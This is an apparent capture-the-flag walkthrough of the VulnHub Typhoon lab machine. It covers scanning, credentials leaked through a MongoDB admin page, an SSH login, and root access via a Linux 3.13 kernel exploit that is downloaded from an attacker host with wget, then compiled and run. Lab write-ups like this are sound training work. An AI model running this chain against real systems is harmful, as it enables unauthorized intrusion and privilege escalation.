You can download the lab link below.

https://www.vulnhub.com/entry/typhoon-102,267/

First we will scan the machine with nmap.

![2](https://user-images.githubusercontent.com/79763515/147369418-79d6b9cc-eec6-432c-94df-7ef216c9458b.png)


When we look at the results, we see that port 80 is open.

Lets scan this web page with nikto

nikto -h http://10.0.2.4 

![nikto sonuç](https://user-images.githubusercontent.com/79763515/147369429-0c0c5bdd-8d0a-4fe1-ae4e-c07e71c55805.png)

We visit "robots.txt" page and it directs us to /mongoadmin/

![4](https://user-images.githubusercontent.com/79763515/147369449-1a1ceb1e-8cfc-4569-9045-355bbb3880d8.png)

![5](https://user-images.githubusercontent.com/79763515/147369458-e7915947-e2cb-44d8-b4e3-0ff54c518670.png)

We should examine the whole page and catch something useful.


![6](https://user-images.githubusercontent.com/79763515/147369468-4f90379d-fa93-49f1-8df2-7333afbf0419.png)

Looks like we got the username and password of typhoon.
We know that ssh port is open so let's use this info for connection.

ssh typhoon@10.0.2.4

![7](https://user-images.githubusercontent.com/79763515/147369492-8ecc135a-c533-4ba9-9b38-9351d066239a.png)

Bingo! We got in the system.

We'll use an exploit for being root

![9](https://user-images.githubusercontent.com/79763515/147369517-f8b02cd5-1a10-49af-a52c-7201909e1545.png)

searchsploit Linux 3.13

![10](https://user-images.githubusercontent.com/79763515/147369529-cadeb6ef-382e-46b4-a576-000b31b7e30d.png)

We'll use this one. copy that

start a simplehttpserver in your kali with

python -m SimpleHTTPServer (you can select the port that you want)

![12](https://user-images.githubusercontent.com/79763515/147369549-9ee2baed-0653-4eb8-a2b5-187f352fe0bc.png)

Now go back to the machine and download the exploit 

cd /tmp

wget http://10.0.2.10:8000/37292.c

![13](https://user-images.githubusercontent.com/79763515/147369566-8820f2ec-6598-4c20-84d5-e903341e967f.png)


looks like it worked

compile it and run

gcc 37292.c -o exploit

./exploit


![14](https://user-images.githubusercontent.com/79763515/147369581-1b9c0031-72b1-449e-b03a-f7a79a7dc564.png)





















